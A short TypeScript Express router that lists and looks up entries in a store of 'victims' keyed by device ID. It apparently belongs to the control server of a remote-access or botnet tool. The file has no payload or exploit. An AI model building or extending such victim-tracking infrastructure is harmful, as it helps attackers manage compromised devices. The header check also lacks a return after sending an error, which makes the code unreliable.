import express from 'express';
import * as core from 'express-serve-static-core';
import Response from "../../classes/Response";
import Victim from '../../classes/Victim';
import victims from '../../victims';

const devicesRouter = express.Router();

devicesRouter.get("/api/devices", (req, res) => {
    var responseObj: Response = {}
    responseObj["message"] = "Device list";
    responseObj["data"] = new Array<Victim>();
    var keys = victims.forEach((value, key, map) => {
        var devList: Array<string> = responseObj["data"];
        devList.push(JSON.stringify(value));
    })
    res.send(JSON.stringify(responseObj));
});

devicesRouter.get("/api/device", (req, res) => {
    var responseObj: Response = {}
    
    if(!("device-id" in req.headers)){
        responseObj["message"] = "Device-ID Not Found in Headers";
        res.status(400);
        res.send(JSON.stringify(responseObj));
    }

    if(!victims.has(req.headers["device-id"] as string)){
        responseObj["message"] = "Device Not Found";
        res.status(400);
        res.send(JSON.stringify(responseObj));
    } 
    else {
        responseObj["message"] = "Device Found";
        responseObj["data"] = victims.get(req.headers["device-id"] as string);

        res.status(200);
        res.send(JSON.stringify(responseObj));
    }
})

export default devicesRouter;